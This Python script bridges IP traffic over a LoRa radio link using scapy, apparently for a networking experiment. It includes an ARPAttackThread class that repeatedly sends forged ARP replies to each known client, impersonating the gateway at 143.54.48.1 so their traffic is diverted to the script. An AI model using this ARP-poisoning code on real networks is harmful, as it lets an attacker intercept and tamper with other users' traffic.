#!/usr/bin/env python3

import sys, threading, argparse
from time import time,sleep
from scapy.all import *
from SX127x.LoRa import *
from SX127x.board_config import BOARD

BOARD.setup()
verbose = False

TREDBOLD =  '\033[31;1m'
TGREEN =  '\033[32m' 
TYELLOW =  '\033[33m'



class ARPAttackThread(threading.Thread):
    def __init__(self, ownIP, ownMAC):
        threading.Thread.__init__(self)
        self.ownIP = ownIP
        self.ownMAC = ownMAC

    def run(self):
        while True:
            for IP, MAC in handler.list:
                arp_reply = Ether(dst = MAC, src = self.ownMAC) / ARP(pdst=IP, hwdst=MAC, psrc="143.54.48.1", hwsrc=self.ownMAC, op=2)
                arp_reply.show()
                sendp(arp_reply, iface="br0")
                sleep(5)

class Queue:
    def __init__(self):
        self.items = []

    def isEmpty(self):
        return self.items == []

    def enqueue(self, item):
        self.items.insert(0,item)

    def dequeue(self):
        return self.items.pop()

    def size(self):
        return len(self.items)

class Handler:
    def __init__(self):
        self.tx_wait = 0
        self.pktlist = Queue()
        self.list = []

    def run(self):
        while True:
            # while there are packets to send
            if (not self.tx_wait) and (not self.pktlist.isEmpty()):
                # gets a packet from the queue
                data = self.pktlist.dequeue()
                # breaks it into pieces
                packets = self.split(data)

                # sends the pieces one by one
                for packet in packets:
                    lora.write_payload(list(packet))
                    lora.set_dio_mapping([1,0,0,0,0,0]) # set DIO0 for txdone
                    lora.set_mode(MODE.TX)
                    self.tx_wait = 1
                    sleep(0.5) # less time for better transmision
            sleep(0.5)

    def pushpkt(self, packet):
        # if is valid packet
        if (packet.haslayer(IP)) and (packet.haslayer(Ether)):
            #if verbose:
            #print(packet.summary())

            #print(self.list)
            #if packet[IP].src in [pos[0] for pos in self.list]:

            if host == 'end':
                known_ip = packet[IP].src in [pos[0] for pos in self.list]
            else:
                known_ip = (packet[IP].src in self.list) and (packet[IP].src != "143.54.49.51")

            if known_ip:
                # the packet is converted into bytes and added to the queue
                self.pktlist.enqueue(bytes(packet))
                print(TYELLOW + "SEND: ")
                print(packet.show())
                print(self.pktlist.size())
            else:
                if packet.haslayer(BOOTP):
                    if host == "end":
                        if packet[IP].src == "0.0.0.0":
                            print(packet.summary())
                            self.pktlist.enqueue(bytes(packet))
                        if (packet[BOOTP].yiaddr != '0.0.0.0' and (packet[BOOTP].yiaddr not in [pos[0] for pos in self.list])):
                            self.list.append((packet[BOOTP].yiaddr, packet[Ether].dst))
                    if host == "middle":
                        if (packet[IP].src != "0.0.0.0"):
                            self.pktlist.enqueue(bytes(packet))

        packet = []

    def split(self, data):
        packets = []
        for i in range(0, len(data), 127):
            packet = data[i:i + 127]
            packets.append(packet)

        return packets

class LoRaSocket(LoRa):
    def __init__(self, verbose=verbose):
        super(LoRaSocket, self).__init__(verbose)
        self.set_mode(MODE.SLEEP)
        self.set_pa_config(pa_select=1)
        self.set_max_payload_length(128) # set max payload to max fifo buffer length
        self.payload = []
        self.set_dio_mapping([0] * 6) #initialise DIO0 for rxdone
        if host == "end":
            self.OWN_IP = get_if_addr("br0")
            self.OWN_MAC = get_if_hwaddr("br0")
        else:
            self.OWN_IP = get_if_addr("eth0")
            self.OWN_MAC = get_if_hwaddr("eth0")

        self.RMAC = "7c:0e:ce:25:60:97"
        #p = srp1(Ether()/IP(dst="8.8.8.8", ttl = 0)/ICMP()/"XXXXXXXXXXX")
        #print(p[Ether].src)

    # when LoRa receives data send to socket conn
    def on_rx_done(self):
        handler.tx_wait = 1
        payload = self.read_payload(nocheck=True)
        self.payload += payload
        # if piece received is the last one
        if len(payload) != 127:
            if len(self.payload) > 34:
                packet = Ether(bytes(self.payload))

                print(handler.list)

            #if (verbose):
                print(TGREEN + "Packet in!  " + packet.summary())

            # if it's not a DHCP packet
                if packet.haslayer(IP) and (not packet.haslayer(BOOTP)):
                    if host == "end":
                        for client_IP, client_MAC in handler.list:
                            #packet[IP].dst = client_IP
                            packet[Ether].dst = client_MAC
                            packet[Ether].src = self.OWN_MAC
                            del packet.chksum
                            del packet[IP].chksum
                            if packet.haslayer(TCP):
                                del packet[TCP].chksum
                            if packet.haslayer(UDP):
                                del packet[UDP].chksum
                            packet.show2()
                            threading.Thread(target=self.send_packet, args=(packet,)).start()

                    if host == "middle":
                        packet[IP].src = self.OWN_IP
                        packet[Ether].src = self.OWN_MAC
                        packet[Ether].dst = self.RMAC
                        del packet.chksum
                        del packet[IP].chksum

                        if packet.haslayer(TCP):
                            del packet[TCP].chksum

                        if packet.haslayer(UDP):
                            del packet[UDP].chksum
                            if packet.haslayer(DNS):
                                packet[IP].dst = "8.8.8.8"

                        if (packet[IP].dst not in handler.list):
                            handler.list.append(packet[IP].dst)

                        packet.show2()

                        threading.Thread(target=self.send_packet, args=(packet,)).start()


                # sends packet to network
                else:
                    print("RQST: ")
                    packet.show()
                    if host == "end":
                        sendp(packet, iface = "br0")
                        #sendp(packet, iface = "wlan0")
                    else:
                        sendp(packet, iface="eth0")
                    #sendp(packet, iface="br0")
                self.payload = []
                handler.tx_wait = 0
                packet = ""
            #sleep(1)

        self.clear_irq_flags(RxDone=1) # clear rxdone IRQ flag
        self.reset_ptr_rx()
        self.set_mode(MODE.RXCONT)

    # after data sent by LoRa reset to receive mode
    def on_tx_done(self):
        self.clear_irq_flags(TxDone=1) # clear txdone IRQ flag
        self.set_dio_mapping([0] * 6)
        self.set_mode(MODE.RXCONT)
        handler.tx_wait = 0

    def send_packet(self, packet):
        # This method sends the packet
        sendp(packet, iface="br0", realtime=True)


if __name__ == '__main__':
    #./transceiver.py -i INTERFACE_IN -o INTERFACE_OUT -v
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--in", dest="pktin", default="lorasend", help="Sniffed Interface (packet in)", required=False)
    parser.add_argument("-o", "--out", dest="pktout", default="lorarecv", help="Send Interface (packet out)", required=False)
    parser.add_argument("-v", "--verbose", dest="verbose", help="Verbose mode", action='store_true')
    parser.add_argument("-m", "--mode", dest="mode", default="end", help="which host is running the code", required=False)
    args = parser.parse_args()
    pktin = args.pktin
    pktout = args.pktout
    host = args.mode
    verbose = args.verbose

    if not verbose:
        print(TREDBOLD + "You are running on silent mode!")

    handler = Handler()
    lora = LoRaSocket(verbose=False)
    lora.set_bw(9)
    lora.set_freq(915)
    # filter only DHCP packets: port 68 and port 67
    #dhcp_pkts = 'port 68 and port 67'
    # remove ssh packets: not port 22
    Sniff = AsyncSniffer(prn=handler.pushpkt, filter="(udp) or (tcp and not (port 22 or port 53))", store=False, iface=pktin)
    # if ARP not being sniffed (should be because the port used by arp is 219 tcp)
    #if end:
    SniffOut = AsyncSniffer(prn=handler.pushpkt, filter = "icmp", iface=pktin, store=False)
    Sniff.start()
    if host == "end":
        arp_thread = ARPAttackThread(get_if_addr("br0"), get_if_hwaddr("br0"))
        arp_thread.start()
    SniffOut.start()
    # runs handler.run() in another thread
    thread = threading.Thread(target=handler.run)
    thread.start()

    try:
        lora.set_mode(MODE.RXCONT)
        while True:
            pass
    finally:
        lora.set_mode(MODE.SLEEP)
        BOARD.teardown()